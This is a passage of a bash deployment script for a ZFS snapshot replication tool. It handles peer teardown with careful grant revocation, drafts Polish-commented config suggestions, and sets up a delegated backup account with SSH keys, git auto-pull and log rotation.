        # relationship's own orphan, a second live delegated account); "the
        # first unknown uid" or "any numeric grant" is not evidence of
        # OWNERSHIP, and REV-20260804-039 F3's own first attempt at this
        # (commit 1f6ca0b) revoked and residue-checked exactly that way --
        # caught before merge, not live, but the review that caught it is
        # correct that it could have taken another relationship's access
        # with it.
        local uid=""
        if id "$account" >/dev/null 2>&1; then
            local live_uid; live_uid=$(id -u "$account")
            if [ -n "${PEER_JOIN_ACCOUNT_UID:-}" ]; then
                [ "$live_uid" = "$PEER_JOIN_ACCOUNT_UID" ] \
                    || die "refusing --leave='$label': account '$account' is uid $live_uid, but the manifest recorded uid $PEER_JOIN_ACCOUNT_UID at join/commit time -- name/uid drift (account recreated under the same name?) is a collision signal, not something to tear down through. Resolve by hand: confirm which uid actually owns this relationship, fix the manifest, then retry. Nothing has been changed."
                uid="$live_uid"
            else
                # Legacy manifest (joined before this field existed) and the
                # account is still live -- safe to capture and use now,
                # exactly as do_commit_scope does at grant time.
                uid="$live_uid"
                log "recording uid $uid for account '$account' before teardown (legacy relationship, no uid was on file)"
            fi
        elif [ -n "${PEER_JOIN_ACCOUNT_UID:-}" ]; then
            uid="$PEER_JOIN_ACCOUNT_UID"
            warn "account '$account' already gone -- using the manifest-recorded uid $uid (never a guess) to find and revoke its grant"
        else
            die "refusing --leave='$label': account '$account' is already gone AND no uid was ever recorded for it (a legacy relationship joined before this field existed, never committed since). There is no durable identifier left to safely find its grant among possibly several numeric/unknown principals on these datasets -- guessing was REV-20260804-039 F3's own first, wrong attempt at this. Resolve by hand: 'zfs allow <dataset>' on each of: ${PEER_JOIN_GRANTED_DATASETS:-<none recorded>} -- identify which numeric uid is actually this relationship's (system logs, /var/log/auth.log around when the account was removed, etc.), then 'zfs unallow -u <that uid> <dataset>' yourself before removing $mpath by hand. Nothing has been changed."
        fi

        local -a datasets=(${PEER_JOIN_GRANTED_DATASETS:-})
        local -a held=()
        local ds
        for ds in "${datasets[@]}"; do
            [ -n "$ds" ] || continue
            if zfs list -H -o name -- "$ds" >/dev/null 2>&1 && commit_scope_dataset_held "$ds"; then
                held+=("$ds")
            fi
        done
        if [ "${#held[@]}" -gt 0 ]; then
            die "refusing --leave='$label': ${held[*]} has an in-flight transfer hold ($COMMIT_SCOPE_HOLD_TAG) -- revoking access now would strand that resume with no way to release its own hold. Retry once the transfer completes; nothing has been changed."
        fi

        # Mirror of do_commit_scope's grant list, `mount` included -- revoke
        # exactly what was granted, or a leave leaves a permission behind.
        local perms="snapshot,destroy,mount,send,hold,release,bookmark"
        for ds in "${datasets[@]}"; do
            [ -n "$ds" ] || continue
            if ! zfs list -H -o name -- "$ds" >/dev/null 2>&1; then
                log "leave: $ds no longer exists on this host -- nothing to revoke"
                continue
            fi
            if zfs unallow -u "$uid" "$perms" -- "$ds" 2>/dev/null; then
                log "leave: revoked ($perms) on $ds from uid $uid ($account)"
            else
                warn "leave: could not revoke uid $uid's grant on $ds -- check by hand: zfs allow $ds"
            fi
        done

        # Verify before userdel, not after -- a grant that survives the loop
        # above (permission denied, a property-level grant unallow -u didn't
        # reach, etc.) must stop this here, not be discovered later as a
        # residue nobody was looking for. Matches ONLY this relationship's
        # exact bound uid, or the exact account name (a drift/collision
        # signal if it still shows under some OTHER uid) -- never "any
        # numeric grant", which would false-positive on a second legitimate
        # delegated account sharing the same dataset.
        local -a residual=()
        for ds in "${datasets[@]}"; do
            [ -n "$ds" ] || continue
            zfs list -H -o name -- "$ds" >/dev/null 2>&1 || continue
            zfs allow "$ds" 2>/dev/null | grep -Eq "(^|[[:space:]])user (${uid}|\(unknown: ${uid}\)|${account})([[:space:],]|$)" \
                && residual+=("$ds")
        done
        if [ "${#residual[@]}" -gt 0 ]; then
            die "refusing to proceed: ${residual[*]} still show a grant for uid $uid or account '$account' after the revoke attempt above -- resolve by hand ('zfs allow <dataset>' to see exactly what, 'zfs unallow -u $uid <dataset>' to remove it), then re-run --leave='$label'. Account (if it still exists) and key left in place."
        fi

        if id "$account" >/dev/null 2>&1; then
            revoke_quiesce_grant "$account"
            passwd -l "$account" >/dev/null 2>&1 || true
            userdel -r "$account" 2>&1 || die "userdel -r $account failed -- its ZFS grants are already revoked and verified gone; resolve the account removal by hand, then re-run --leave='$label' to finish cleaning up state"
            log "leave: removed account '$account' (uid $uid) and its home directory"
        else
            log "leave: account '$account' (uid $uid) already gone; its orphaned grant is now cleared"
        fi
    fi

    rm -f "$mpath" "$(peer_scope_path "$label")" "$(peer_scope_granted_hash_path "$label")"
    log "leave: removed the join manifest and any scope file/hash for '$label'"
    log "leave: '$label' fully torn down on this host. Nothing done on the collector -- see --unpair there."
}

# do_draft_config -- best-effort, deliberately conservative. gen-cron.sh's INI
# is template-based ([dataset:X] refers to a [template:tier] this script has
# no way to know), so this does NOT fabricate schedule/retention/tiers -- it
# only lists candidates plus the conventional path/addressing, as
# commented-out stanzas for a human to turn into real [dataset:] sections.
#
# Role-aware since 2026-07-29 (was push-only before): snapget.sh v2.61+
# addresses pull literally (arg1 = the real remote name, never a base), so
# what to list and what field to emit both depend on PEER_SAVED_ROLE.
#   pull -- the peer HOLDS the source. List ITS datasets (unchanged query),
#           emit 'src = user@host:<literal-name>' with the LOCAL path
#           per-peer-nested ($PEER_SAVED_TARGET/$label/<name>) so multiple
#           peers can never collide under one local pool -- this exact shape
#           was impossible before the addressing flip (see
#           project_srcbase_path_composition_limit in memory).
#   push -- the peer HOLDS the target. Listing the peer's datasets would
#           suggest datasets we don't own; list LOCAL ones instead, emit
#           'dst = user@host:base' with THIS host nested under the peer's
#           target ($PEER_SAVED_TARGET/<this-host-label>/<name>), matching
#           the same collision-safe convention from the other direction.
# Splits a dataset listing against the list this pairing actually covers.
#
# Until 2026-07-29 the draft emitted one stanza per dataset the peer could
# see -- and `zfs allow` scopes OPERATIONS, not `zfs list` visibility, so the
# peer sees its whole tree. On real pve2 that was 81 identical-looking
# stanzas of which two were usable; uncommenting any of the other 79 produced
# a config that generates cleanly and fails at 2am with permission denied.
#
# Descendants are covered too (zfs allow is inherited), which is why the useful
# unit to suggest is the granted ROOT plus how many descendants it has -- that
# is exactly the -R decision -- rather than a stanza per descendant.
#
# Sets: DRAFT_ROOTS (name<TAB>descendant-count), DRAFT_MISSING (declared but
# not present on that host), DRAFT_UNCOVERED (present but outside the pairing,
# shallow ones only), DRAFT_DEEPER (how many uncovered ones were too deep to
# be worth printing).
draft_classify() {
    local full="$1" granted="$2"
    declare -ga DRAFT_ROOTS=() DRAFT_MISSING=() DRAFT_UNCOVERED=()
    declare -g DRAFT_DEEPER=0
    local ds n

    # Pure bash `case` matching throughout, deliberately: a dataset name is not
    # a regex, and the per-peer paths this feature invents routinely contain
    # dots (the label is derived from --peer, so 192.168.28.8 is a normal
    # component). Feeding that to grep would make '.' match any character.
    local -a present=() found=()
    while IFS= read -r ds; do [ -n "$ds" ] && present+=("$ds"); done <<< "$full"

    for ds in $granted; do
        n=0
        local seen=0 p
        for p in "${present[@]}"; do
            [ "$p" = "$ds" ] && { seen=1; continue; }
            case "$p" in "$ds"/*) n=$((n + 1)) ;; esac
        done
        if [ "$seen" -eq 1 ]; then
            DRAFT_ROOTS+=("$ds	$n")
        else
            DRAFT_MISSING+=("$ds")
        fi
    done

    local covered
    for ds in "${present[@]}"; do
        covered=0
        for n in $granted; do
            [ "$ds" = "$n" ] && { covered=1; break; }
            case "$ds" in "$n"/*) covered=1; break ;; esac
        done
        [ "$covered" -eq 1 ] && continue
        # Only the shallow ones get printed. The point of this section is "did
        # you forget to include something", which a first-level view answers;
        # a full dump would recreate the wall of noise this exists to remove.
        case "$ds" in
            */*/*) DRAFT_DEEPER=$((DRAFT_DEEPER + 1)) ;;
            *) DRAFT_UNCOVERED+=("$ds") ;;
        esac
    done
}

# The "not part of this pairing" section, shared by both roles. Never emitted
# as stanzas -- these are informational, and the whole point is that they must
# not look copy-pasteable.
draft_emit_uncovered() {
    local how_to_add="$1"
    { [ "${#DRAFT_UNCOVERED[@]}" -gt 0 ] || [ "$DRAFT_DEEPER" -gt 0 ]; } || return 0
    echo
    echo "# =========================================================="
    echo "# NIE OBJETE TA RELACJA -- do informacji, NIE kopiuj nizej."
    echo "# =========================================================="
    echo "# Ponizsze istnieja, ale nie sa czescia tego parowania."
    echo "# $how_to_add"
    echo "#"
    local ds
    for ds in "${DRAFT_UNCOVERED[@]}"; do echo "#   $ds"; done
    [ "$DRAFT_DEEPER" -gt 0 ] && echo "#   ... oraz $DRAFT_DEEPER glebszych (pominiete, to widok pierwszego poziomu)"
    return 0
}

do_draft_config() {
    local label="$1" mpath="$2"
    [ -r "$mpath" ] || die "no pairing for '$PEER_HOST' yet -- run --pair (and --join on the peer) first"
    # shellcheck disable=SC1090
    . "$mpath"
    local keyfile="$PEER_KEY_DIR/${label}_ed25519"
    [ -f "$keyfile" ] || die "expected keyfile $keyfile not found"
    local remote_user="${PEER_SAVED_ACCOUNT:-root}"
    local role="${PEER_SAVED_ROLE:-pull}"

    # $keyfile above is root's, and this function's own ssh runs as root, so it
    # keeps using it. The EMITTED -K is a different question: it belongs to
    # whichever account will run the cron line, which for a delegated setup
    # cannot read /root/.ssh/pairing at all.
    local job_keyfile; job_keyfile=$(local_keyfile_path "$label" "${PEER_SAVED_LOCAL_USER:-}")
    if [ -n "${PEER_SAVED_LOCAL_USER:-}" ] && [ ! -r "$job_keyfile" ]; then
        warn "expected $job_keyfile for ${PEER_SAVED_LOCAL_USER} but it is not there -- re-run --pair with --local-user=${PEER_SAVED_LOCAL_USER} to reinstall it"
    fi

    # The other half: -k. --pair verifies the peer's host key by hand (keyscan,
    # fingerprint, "CONFIRM this"), and until 2026-07-29 that verification then
    # sat in a file the job never opened -- so the nightly connection fell back
    # to accept-new and trusted whatever answered on its own first run. Emitted
    # only when the pinned file actually exists: a -k pointing at nothing turns
    # StrictHostKeyChecking=yes into a job that can never connect at all, which
    # is a worse outcome than the accept-new it replaces.
    # The port the pairing was made on. Emitted only when it is not 22: a
    # '-p 22' on every suggested line is noise, and noise is what trains people
    # to stop reading the flags. Silently dropping it was the older bug -- the
    # manifest knew the port, the ssh calls in THIS script used it, and the one
    # thing that ends up in cron did not.
    local job_port="${PEER_SAVED_PORT:-22}"
    local port_flag=""
    [ "$job_port" != "22" ] && port_flag=" -p ${job_port}"

    local job_knownhosts; job_knownhosts=$(local_knownhosts_path "$label" "${PEER_SAVED_LOCAL_USER:-}")
    local kh_flag=""
    if [ -f "$job_knownhosts" ]; then
        kh_flag=" -k ${job_knownhosts}"
    else
        warn "no pinned host-key file at $job_knownhosts -- this pairing predates host-key pinning for the job account, so the draft omits -k and the job would use accept-new. Re-run: bash deploy.sh --pair --peer=$PEER_HOST${PEER_SAVED_LOCAL_USER:+ --local-user=$PEER_SAVED_LOCAL_USER}"
    fi

    local outdir="/root/scripts/pairing"
    mkdir -p "$outdir"
    local out="$outdir/${label}.conf.suggested"

    local granted="${PEER_SAVED_DATASETS:-}"
    if [ -z "$granted" ]; then
        warn "manifest for '$PEER_HOST' has no dataset list -- every candidate will be listed unfiltered, as before 2026-07-29. Re-run --pair with --peer-datasets=\"...\" to get a filtered draft."
    fi

    if [ "$role" = "pull" ]; then
        log "listing datasets on ${remote_user}@${PEER_HOST} via the pairing key (pull: peer holds the source)..."
        local list
        list=$(ssh -i "$keyfile" -p "${PEER_SAVED_PORT:-22}" -o BatchMode=yes "${remote_user}@${PEER_HOST}" \
            "zfs list -H -o name") || die "could not list datasets on $PEER_HOST -- has --join run there yet?"
        [ -n "$granted" ] || granted="$list"
        draft_classify "$list" "$granted"
        {
            echo "# Kandydaci z hosta '$PEER_HOST' (rola: pull), wygenerowane przez --draft-config."
            echo "# NIC z tego nie jest gotowa sekcja INI ani nie jest zainstalowane."
            echo "# gen-cron.sh v4 wymaga [dataset:<path>] z polem 'use_template ='"
            echo "# odwolujacym sie do JUZ ISTNIEJACEGO [template:] w Twoim configu --"
            echo "# ten generator ich nie zna i ich nie zgaduje. To pole jest"
            echo "# OBOWIAZKOWE: bez niego gen-cron.sh konczy 'has no use_template'."
            echo "#"
            echo "# 'src' to LITERALNA nazwa na peerze (dokladnie to co widac w zfs"
            echo "# list tam) -- lokalna sciezka ponizej musi konczyc sie tym samym"
            echo "# ciagiem, gen-cron.sh sam wyliczy lokalny base."
            echo "#"
            echo "# Bez '-K' zadanie probowaloby uwierzytelnic sie domyslnym kluczem"
            echo "# SSH tego konta zamiast dedykowanego klucza tej relacji -- konto"
            echo "# ${remote_user} na peerze zna WYLACZNIE ten klucz."
            echo "#"
            echo "# '-k' to druga strona tego samego: przypiety klucz HOSTA peera,"
            echo "# ten sprawdzony recznie przy --pair. Bez niego zadanie wraca do"
            echo "# accept-new, czyli ufa temu, co odpowie przy pierwszym polaczeniu."
            [ -n "$kh_flag" ] || echo "# UWAGA: brak pliku $job_knownhosts -- '-k' pominiete, patrz log."
            if [ -n "$port_flag" ]; then
                echo "#"
                echo "# '-p ${job_port}': parowanie zrobiono na niestandardowym porcie."
                echo "# Bez niego zadanie poszloby na 22 -- a przypiety klucz hosta jest"
                echo "# zapisany jako '[host]:${job_port}', wiec i tak by go nie znalazlo."
            fi
            echo
            echo "# =========================================================="
            echo "# OBJETE TA RELACJA (${#DRAFT_ROOTS[@]}) -- tylko te maja 'zfs allow'"
            echo "# dla konta ${remote_user} na peerze. Reszta drzewa jest tam WIDOCZNA"
            echo "# (zfs allow ogranicza operacje, nie 'zfs list'), ale nieuzywalna."
            echo "# =========================================================="
            local ds n
            while IFS=$'\t' read -r ds n; do
                [ -n "$ds" ] || continue
                echo
                [ "$n" -gt 0 ] && echo "# ($ds ma $n datasetow potomnych -- 'zfs allow' dziedziczy"
                [ "$n" -gt 0 ] && echo "#  na nie, wiec 'recursive' ponizej obejmie caly podzbior:"
                [ "$n" -gt 0 ] && echo "#  'flat' = kazdy potomek osobnym zadaniem, 'atomic' = cale"
                [ "$n" -gt 0 ] && echo "#  poddrzewo jednym strumieniem w jednym punkcie czasu.)"
                echo "# [dataset:${PEER_SAVED_TARGET}/${label}/${ds}]"
                echo "#   src          = ${remote_user}@${PEER_HOST}:${ds}"
                [ "$n" -gt 0 ] && echo "#   recursive    = flat"
                echo "#   flags        = -K ${job_keyfile}${kh_flag}${port_flag}"
                echo "#   use_template = <WYBIERZ ISTNIEJACY [template:]>"
            done < <(printf '%s\n' "${DRAFT_ROOTS[@]}")
            if [ "${#DRAFT_MISSING[@]}" -gt 0 ]; then
                echo
                echo "# UWAGA: zadeklarowane w parowaniu, ale NIE ISTNIEJA na $PEER_HOST:"
                for ds in "${DRAFT_MISSING[@]}"; do echo "#   $ds"; done
            fi
            draft_emit_uncovered "Zeby dolozyc: --pair --peer=$PEER_HOST --peer-datasets=\"$granted <nowy>\", potem --join na peerze."
        } > "$out"
    else
        local my_label; my_label=$(hostname -s)
        log "listing LOCAL datasets (push: this host is the source, $PEER_HOST holds the target)..."
        local list
        list=$(zfs list -H -o name) || die "could not list local datasets"
        [ -n "$granted" ] || granted="$list"
        draft_classify "$list" "$granted"
        {
            echo "# Kandydaci LOKALNE (rola: push do '$PEER_HOST'), wygenerowane przez --draft-config."
            echo "# NIC z tego nie jest gotowa sekcja INI ani nie jest zainstalowane."
            echo "# gen-cron.sh v4 wymaga [dataset:<path>] z polem 'use_template ='"
            echo "# odwolujacym sie do JUZ ISTNIEJACEGO [template:] w Twoim configu --"
            echo "# ten generator ich nie zna i ich nie zgaduje. To pole jest"
            echo "# OBOWIAZKOWE: bez niego gen-cron.sh konczy 'has no use_template'."
            echo "#"
            echo "# Bez '-K' zadanie probowaloby uwierzytelnic sie domyslnym kluczem"
            echo "# SSH tego konta zamiast dedykowanego klucza tej relacji -- konto"
            echo "# ${remote_user} na peerze zna WYLACZNIE ten klucz."
            echo "#"
            echo "# '-k' to druga strona tego samego: przypiety klucz HOSTA peera,"
            echo "# ten sprawdzony recznie przy --pair. Bez niego zadanie wraca do"
            echo "# accept-new, czyli ufa temu, co odpowie przy pierwszym polaczeniu."
            [ -n "$kh_flag" ] || echo "# UWAGA: brak pliku $job_knownhosts -- '-k' pominiete, patrz log."
            if [ -n "$port_flag" ]; then
                echo "#"
                echo "# '-p ${job_port}': parowanie zrobiono na niestandardowym porcie."
                echo "# Bez niego zadanie poszloby na 22 -- a przypiety klucz hosta jest"
                echo "# zapisany jako '[host]:${job_port}', wiec i tak by go nie znalazlo."
            fi
            echo
            echo "# =========================================================="
            echo "# OBJETE TA RELACJA (${#DRAFT_ROOTS[@]}) -- te datasety zadeklarowano"
            echo "# przy parowaniu. Strona odbiorcza jest delegowana na peerze na jednym"
            echo "# korzeniu, wiec wypchniecie czegokolwiek innego tez by przeszlo --"
            echo "# ale wtedy config przestaje odpowiadac temu, co mowi manifest."
            echo "# =========================================================="
            local ds n
            while IFS=$'\t' read -r ds n; do
                [ -n "$ds" ] || continue
                echo
                [ "$n" -gt 0 ] && echo "# ($ds ma $n datasetow potomnych -- 'recursive' ponizej obejmie caly"
                [ "$n" -gt 0 ] && echo "#  podzbior: 'flat' = kazdy potomek osobnym zadaniem, 'atomic' = cale"
                [ "$n" -gt 0 ] && echo "#  poddrzewo jednym strumieniem w jednym punkcie czasu.)"
                echo "# [dataset:$ds]"
                echo "#   dst          = ${remote_user}@${PEER_HOST}:${PEER_SAVED_TARGET}/${my_label}/${ds}"
                [ "$n" -gt 0 ] && echo "#   recursive    = flat"
                echo "#   flags        = -K ${job_keyfile}${kh_flag}${port_flag}"
                echo "#   use_template = <WYBIERZ ISTNIEJACY [template:]>"
            done < <(printf '%s\n' "${DRAFT_ROOTS[@]}")
            if [ "${#DRAFT_MISSING[@]}" -gt 0 ]; then
                echo
                echo "# UWAGA: zadeklarowane w parowaniu, ale NIE ISTNIEJA na tym hoscie:"
                for ds in "${DRAFT_MISSING[@]}"; do echo "#   $ds"; done
            fi
            draft_emit_uncovered "Zeby dolozyc: --pair --peer=$PEER_HOST --peer-datasets=\"$granted <nowy>\" (i --join na peerze)."
        } > "$out"
    fi
    log "draft napisany: $out -- przejrzyj recznie przed dotknieciem cron-configs"
}

if [ "$PAIR_MODE" -eq 1 ]; then
    do_pair
    exit 0
fi
if [ "$JOIN_MODE" -eq 1 ]; then
    do_join
    JOIN_RERUN_NEEDED=0
    exit 0
fi
if [ "$DRAFT_SCOPE_MODE" -eq 1 ]; then
    do_draft_scope "$DRAFT_SCOPE_LABEL"
    exit 0
fi
# --commit-scope is NOT dispatched here any more; it runs before Phase 1, beside
# --pause/--resume. See the block there for why.
if [ "$LEAVE_MODE" -eq 1 ]; then
    do_leave "$LEAVE_LABEL"
    exit 0
fi

# ------------------------------------------------------------------------------
log "Phase 8: delegated non-root account"
# ------------------------------------------------------------------------------
# BACKUP_USER is about CREATION. Maintenance is automatic: if it is empty we
# look for an account that already has its own checkout and keep that one up to
# date. That is what lets a bare `bash deploy.sh` be correct on every host in
# the fleet without anyone tracking which machine has an account.
CREATE_ACCOUNT=1
if [ -z "$BACKUP_USER" ]; then
    CREATE_ACCOUNT=0
    for _cand in /home/*/zfs-snapshot-all; do
        [ -d "$_cand" ] || continue
        _owner=$(stat -c %U "$(dirname "$_cand")" 2>/dev/null) || continue
        id "$_owner" >/dev/null 2>&1 && { BACKUP_USER="$_owner"; break; }
    done
    [ -n "$BACKUP_USER" ] && log "detected existing delegated account: $BACKUP_USER (maintaining it; pass --backup-user to create one)"
fi

if [ -z "$BACKUP_USER" ]; then
    log "no delegated account on this host and none requested -- skipping (pass --backup-user=NAME to create one)"
    # Unreachable while the argument check above stands, and kept anyway: it is
    # the invariant itself rather than one way of enforcing it. If --allow-quiesce
    # is ever allowed to lean on detection again, this is what stops the run from
    # reporting success having granted nothing (REV-20260801-022 F1).
    [ "$ALLOW_QUIESCE" -eq 1 ] && die "--allow-quiesce was requested but there is no delegated account on this host to receive it. Name one with --backup-user=NAME (and --datasets=\"...\"), or drop --allow-quiesce. No grant, whitelist or sudoers rule was created."
elif [ "$CHECK_ONLY" -eq 1 ]; then
    if id "$BACKUP_USER" >/dev/null 2>&1; then
        log "  account $BACKUP_USER exists"
        id -nG "$BACKUP_USER" | tr ' ' '
' | grep -qx "zfsalert" || warn "  $BACKUP_USER not in group zfsalert -- it could not queue alerts, and lib-cron.sh would refuse to lock its own crontab (REV-20260803-035)"
        [ -x "/home/$BACKUP_USER/notify-fail.sh" ] || warn "  /home/$BACKUP_USER/notify-fail.sh missing -- that account cannot report findings"
        [ -f "/etc/logrotate.d/zfs-snapshot-all-$BACKUP_USER" ] || warn "  no logrotate stanza for $BACKUP_USER"
    else
        warn "  account $BACKUP_USER does not exist -- re-run without --check-only to create it"
    fi
elif [ "$CREATE_ACCOUNT" -eq 0 ] && ! id "$BACKUP_USER" >/dev/null 2>&1; then
    log "no delegated account to maintain -- skipping"
    # Same invariant as above: a detected name that turns out not to be an
    # account is still nobody to grant to (REV-20260801-022 F1).
    [ "$ALLOW_QUIESCE" -eq 1 ] && die "--allow-quiesce was requested but '$BACKUP_USER' is not an account on this host. Name one with --backup-user=NAME (and --datasets=\"...\"), or drop --allow-quiesce. No grant, whitelist or sudoers rule was created."
else
    USERNAME="$BACKUP_USER"
    HOMEDIR="/home/$USERNAME"
    # shellcheck disable=SC2206
    DATASETS=($BACKUP_USER_DATASETS)
    ACCOUNT_REPO_DIR="$HOMEDIR/zfs-snapshot-all"
    # ------------------------------------------------------------------------------
    log "Phase 8a: service account $USERNAME"
    # ------------------------------------------------------------------------------
    if id "$USERNAME" >/dev/null 2>&1; then
        log "user $USERNAME already exists, leaving it alone"
    else
        useradd -m -s /bin/bash -c "zfs-snapshot-all delegated backup account" "$USERNAME" \
            || die "useradd failed"
        passwd -l "$USERNAME" >/dev/null || warn "could not lock password for $USERNAME"
        log "created user $USERNAME (uid $(id -u "$USERNAME")), password locked (SSH key only)"
    fi

    # ------------------------------------------------------------------------------
    log "Phase 8b: lock/state directory"
    # ------------------------------------------------------------------------------
    RUNDIR="$HOMEDIR/run"
    mkdir -p "$RUNDIR"
    chown "$USERNAME:$USERNAME" "$RUNDIR"
    log "LOCKDIR for this account: $RUNDIR"

    # ------------------------------------------------------------------------------
    log "Phase 8c: SSH keypair"
    # ------------------------------------------------------------------------------
    SSHDIR="$HOMEDIR/.ssh"
    if [ -f "$SSHDIR/id_ed25519" ]; then
        log "SSH keypair already exists, leaving it alone"
    else
        su "$USERNAME" -c "mkdir -p ~/.ssh && chmod 700 ~/.ssh && ssh-keygen -t ed25519 -N '' -f ~/.ssh/id_ed25519 -C '${USERNAME}@$(hostname -s)'" \
            || die "ssh-keygen failed"
    fi
    log "public key (see Part 6 below for what to do with it):"
    cat "$SSHDIR/id_ed25519.pub"

    # ------------------------------------------------------------------------------
    log "Phase 8d: repo checkout at $ACCOUNT_REPO_DIR (readable+executable by $USERNAME)"
    # ------------------------------------------------------------------------------
    if [ -d "$ACCOUNT_REPO_DIR/.git" ]; then
        log "$ACCOUNT_REPO_DIR is already a git repo, pulling..."
        su "$USERNAME" -c "git -C '$ACCOUNT_REPO_DIR' remote get-url origin 2>/dev/null" | grep -qF "$REPO_URL" \
            || warn "existing repo's origin does not match $REPO_URL -- check manually"
        su "$USERNAME" -c "git -C '$ACCOUNT_REPO_DIR' pull --ff-only origin main" \
            || die "git pull --ff-only failed -- local repo has diverged, resolve manually"

    elif [ -d "$ACCOUNT_REPO_DIR" ] && [ -n "$(ls -A "$ACCOUNT_REPO_DIR" 2>/dev/null)" ]; then
        log "$ACCOUNT_REPO_DIR exists with files but is not a git repo (plain scripts from an earlier manual copy?)"
        BACKUP_DIR="${REPO_DIR}.bak-preGit-$(date +%Y%m%d%H%M%S)"
        mkdir -p "$BACKUP_DIR"
        for f in snapsend.sh snapget.sh delsnaps.sh gen-cron.sh; do
            if [ -e "$ACCOUNT_REPO_DIR/$f" ]; then
                mv "$ACCOUNT_REPO_DIR/$f" "$BACKUP_DIR/"
                log "  moved $f -> $BACKUP_DIR/"
            fi
        done
        chown -R "$USERNAME:$USERNAME" "$BACKUP_DIR"

        su "$USERNAME" -c "cd '$ACCOUNT_REPO_DIR' && git init && git remote add origin '$REPO_URL' && git fetch origin && git checkout -b main --track origin/main" \
            || die "git init/checkout failed"

        log "Diff against backup (should be empty besides new .git/.gitignore/.gitattributes):"
        diff -rq "$BACKUP_DIR" "$ACCOUNT_REPO_DIR" 2>&1 | grep -v "^Only in $ACCOUNT_REPO_DIR:" || true

    else
        log "$ACCOUNT_REPO_DIR does not exist or is empty -- plain clone"
        su "$USERNAME" -c "git clone '$REPO_URL' '$ACCOUNT_REPO_DIR'" || die "git clone failed"
    fi
    # Only the standalone executables, NEVER a blanket *.sh. lib-zfs-snap.sh is
    # sourced, not executed, and git tracks it as 100644 -- chmod +x on it makes
    # the checkout permanently dirty with a mode change, and the hourly
    # `git pull --ff-only` this account runs then FAILS the first time that file
    # changes upstream. Found on both metropolis accounts, inherited from the
    # old deploy_backup_user.sh.
    for f in snapsend.sh snapget.sh delsnaps.sh gen-cron.sh check-snap-age.sh deploy.sh; do
        [ -e "$ACCOUNT_REPO_DIR/$f" ] && chmod +x "$ACCOUNT_REPO_DIR/$f"
    done

    # ------------------------------------------------------------------------------
    log "Phase 8e: auto-pull cron line (this account's own crontab)"
    # ------------------------------------------------------------------------------
    PULL_LINE="15 * * * * cd $ACCOUNT_REPO_DIR && git pull --ff-only origin main >>$HOMEDIR/git-pull.log 2>&1"
    # Into the account's own host block, and adopted rather than rewritten: this
    # line was loose here too, and the account's crontab is the one that also
    # carries a gen-cron managed block -- two neighbours that must never be able
    # to overwrite one another.
    if cron_block_adopt_line "$USERNAME" "$CRON_HOST_BLOCK" \
           "$ACCOUNT_REPO_DIR && git pull" "$PULL_LINE" "$CRON_HOST_TAIL"; then
        if [ "${CRON_CHANGED:-0}" -eq 0 ]; then
            log "auto-pull cron line already in $USERNAME's '$CRON_HOST_BLOCK' block, leaving it alone"
        elif [ "${CRON_ADOPTED:-0}" -gt 0 ]; then
            log "moved $USERNAME's auto-pull cron line into the '$CRON_HOST_BLOCK' block (schedule unchanged)"
        else
            log "added auto-pull cron line to $USERNAME's crontab"
        fi
    else
        warn "could not install auto-pull cron line for $USERNAME: $CRON_ERR -- add it manually"
    fi

    # ------------------------------------------------------------------------------
    log "Phase 8f: alerting access + log rotation for this account"
    # ------------------------------------------------------------------------------
    # This account cannot see ANYTHING under /root: that directory is 0700, so the
    # notify scripts, the alert config and the alert queue are all out of reach.
    # The shortcut of opening /root/scripts to a group is a privilege escalation --
    # root executes those scripts from cron, so an account able to write there could
    # replace them. Instead the two accounts share one group-writable DATA directory
    # (created in phase 3 above) and this account gets its own copies of the
    # two reporting scripts. alert-digest.sh stays root-only and reads the shared
    # queue, so the host still sends exactly ONE mail a day covering both accounts.
    ALERT_GROUP="zfsalert"
    ALERT_SHARED_DIR="/var/lib/zfs-snapshot-all"
    ALERT_CONF="/etc/zfs-alert.conf"

    # No "did you run the other script first" guard here any more: phase 3 of THIS
    # script created the group and the shared directory a few hundred lines above.
    # Removing that ordering dependency is the whole point of the merge.
        if id -nG "$USERNAME" | tr ' ' '\n' | grep -qx "$ALERT_GROUP"; then
            log "$USERNAME already in group $ALERT_GROUP"
        else
            usermod -aG "$ALERT_GROUP" "$USERNAME" && log "added $USERNAME to group $ALERT_GROUP"
            log "  NOTE: group membership applies to NEW sessions -- this account's cron picks it up on its next run"
        fi

        # Same two scripts root has, same shared queue, same config. Only the digest
        # is not duplicated: two digests would mean two mails per host per day.
        for s in notify-fail notify-warn; do
            if [ -f "/root/scripts/$s.sh" ]; then
                install -o "$USERNAME" -g "$USERNAME" -m 0755 "/root/scripts/$s.sh" "$HOMEDIR/$s.sh" \
                    && log "installed $HOMEDIR/$s.sh (copy of root's, same shared queue)"
            else
                warn "/root/scripts/$s.sh not found -- $USERNAME has no way to report findings"
            fi
        done
        [ -r "$ALERT_CONF" ] || warn "$ALERT_CONF missing -- this account will fall back to built-in defaults (daily)"

    LOGROTATE_CONF="/etc/logrotate.d/zfs-snapshot-all-$USERNAME"
    LOGROTATE_MARKER="# zfs-snapshot-all $USERNAME logrotate v2"
    if [ -e "$LOGROTATE_CONF" ] && grep -qF "$LOGROTATE_MARKER" "$LOGROTATE_CONF" 2>/dev/null; then
        log "$LOGROTATE_CONF already current, leaving it alone"
    else
        # A SEPARATE stanza from root's, and the reason is 'create': rotating these
        # with root's stanza would hand the fresh file to root:root, and this account
        # -- which owns the directory but not that file -- could no longer append.
        # Its cron would stop logging silently, since the redirect is >> in the
        # background with nobody reading the error.
        #
        # cron.log is listed here as of v2. It was missing while this account only
        # ever ran git-pull and receive-side work; once a managed cron block can be
        # installed FOR the account (zfs-backup.sh --local-user, or a migration of
        # root's block), every job line redirects into $HOMEDIR/cron.log and that
        # file grew without bound. Measured on a real host: root's equivalent is
        # ~250 KB/day, 2.3 MB by the monthly rotation. Nothing alerts on a large
        # log, so this fails silently until the filesystem is full.
        cat > "$LOGROTATE_CONF" <<EOF
$LOGROTATE_MARKER -- managed by deploy.sh, re-run it to update.
$HOMEDIR/cron.log
$HOMEDIR/git-pull.log
$HOMEDIR/zfs-snapshot-stats.log
{
    monthly
    rotate 24
    maxsize 50M
    compress
    delaycompress
    notifempty
    missingok
    su $USERNAME $USERNAME
    create 0644 $USERNAME $USERNAME
}
EOF
        chmod 0644 "$LOGROTATE_CONF"
        log "created $LOGROTATE_CONF (monthly, keep 24, owned by $USERNAME)"
    fi
    if command -v logrotate >/dev/null; then
        logrotate --debug "$LOGROTATE_CONF" >/dev/null 2>&1 \
            && log "  logrotate config parses cleanly" \
            || warn "  logrotate rejected $LOGROTATE_CONF -- check it by hand"
    fi

    # ------------------------------------------------------------------------------
